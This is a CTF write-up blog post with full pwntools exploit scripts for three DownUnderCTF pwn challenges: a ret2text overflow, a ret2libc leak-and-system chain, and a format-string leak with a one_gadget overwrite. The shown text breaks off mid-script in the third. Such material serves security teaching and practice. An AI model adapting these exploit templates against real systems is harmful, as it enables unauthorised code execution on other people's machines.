<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>wp DownUnderCTF | I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="DownUnderCTF PWN WPplatform 1 [shellthis]There is a backdoor function named get_shell, then use ret2txt way to get shell exp1234567891011121314151617181920212223242526272829303132333435363738394041424">
<meta property="og:type" content="article">
<meta property="og:title" content="wp DownUnderCTF">
<meta property="og:url" content="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="DownUnderCTF PWN WPplatform 1 [shellthis]There is a backdoor function named get_shell, then use ret2txt way to get shell exp1234567891011121314151617181920212223242526272829303132333435363738394041424">
<meta property="og:locale">
<meta property="article:published_time" content="2020-09-21T16:32:31.000Z">
<meta property="article:modified_time" content="2020-09-22T13:46:56.054Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-wp-down-under-ctf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/22/wp-down-under-ctf/" class="article-date">
  <time datetime="2020-09-21T16:32:31.000Z" itemprop="datePublished">2020-09-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      wp DownUnderCTF
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="DownUnderCTF-PWN-WP"><a href="#DownUnderCTF-PWN-WP" class="headerlink" title="DownUnderCTF PWN WP"></a>DownUnderCTF PWN WP</h1><p><a target="_blank" rel="noopener" href="https://play.duc.tf/login?next=/team?next=%252Fchallenges%253F#added%20protection-63">platform</a></p>
<h2 id="1-shellthis"><a href="#1-shellthis" class="headerlink" title="1 [shellthis]"></a>1 [shellthis]</h2><p>There is a backdoor function named get_shell, then use ret2txt way to get shell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(elf.sym[<span class="string">&#x27;get_shell&#x27;</span>])</span><br><span class="line">	sl(p)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="2-return-to-what"><a href="#2-return-to-what" class="headerlink" title="2 [return-to-what]"></a>2 [return-to-what]</h2><p>This vuln </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where would you like to return to?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This vuln is a common stack overflow vuln, but no backdoor function we can use. we should leak libc base address before program end, then use ret2libc methond to call system function to get shell.</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./return-to-what&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30003</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	pop_rdi = <span class="number">0x040122b</span></span><br><span class="line">	ret = <span class="number">0x0401016</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(<span class="number">0x4011AD</span>)</span><br><span class="line">	db()</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	libc_base = leak - <span class="number">0x0809c0</span></span><br><span class="line">	li(<span class="string">&#x27;lib_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">	sh_str = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(ret)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(sh_str)</span><br><span class="line">	p += p64(system)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>







<h2 id="3-echos"><a href="#3-echos" class="headerlink" title="3 [echos]"></a>3 [echos]</h2><p>This program is a echo server, to print what you input. It’s easy to find a vulnerability in this program.It is format vul. we need use this vulnerability to leak main function return address in stack and leak libc base address.  Use libc database to search libc version by countent of leak then to download it. a one_gadget tool is very useful tool for searching one gadget in libc.  In order to get shell we should modify main ret address in stack as one gadget</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./echos.bk&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	offset = <span class="number">8</span></span><br><span class="line">	p = <span class="string">&#x27;%11$p,%27$p,%19$p&#x27;</span></span><br><span class="line"></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	elf_base = leak - (<span class="number">0x563d9cb8e8dd</span> - <span class="number">0x563d9cb8e000</span>)</span><br><span class="line">	li(<span class="string">&#x27;elf_base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak stack base</span></span><br><span class="line">	ru(<span class="string">&#x27;,0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;stack_leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	main_ret = leak - (<span class="number">0x7ffc1f9e87e0</span> - <span 